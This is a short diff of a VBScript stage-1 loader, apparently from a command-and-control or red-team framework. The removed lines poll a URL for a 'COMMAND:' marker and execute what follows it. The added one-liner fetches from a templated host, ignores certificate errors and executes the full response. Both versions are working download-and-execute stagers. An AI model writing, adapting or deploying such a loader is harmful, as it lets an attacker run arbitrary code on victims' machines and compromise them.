@@ -1,13 +1,1 @@
-On Error Resume Next
-Set Shell = CreateObject("WScript.Shell")
-Break = False
-While Break <> True
-    Set XmlHttpReq = WScript.CreateObject("MSXML2.ServerXMLHTTP")
-    XmlHttpReq.Open "GET", "http://127.0.0.1:80/PremiumGames.xhtml", false
-    XmlHttpReq.Send
-    If InStr(XmlHttpReq.responseText, "COMMAND:") Then
-        'WScript.Echo "Stage1 Executing Stage2..." & VBNewLine & Mid(XmlHttpReq.responseText, InStr(XmlHttpReq.responseText, "COMMAND:")+8, Len(XmlHttpReq.responseText))
-        Execute Mid(XmlHttpReq.responseText, InStr(XmlHttpReq.responseText, "COMMAND:")+8, Len(XmlHttpReq.responseText))
-        Break = True
-    End If
-Wend
+On Error Resume Next:Set X=CreateObject("MSXML2.ServerXMLHTTP.6.0"):X.setOption 2,13056:X.Open"GET","<http_prefix>://<host_and_port><registered_uri_path>",0:X.Send:Execute X.responseText
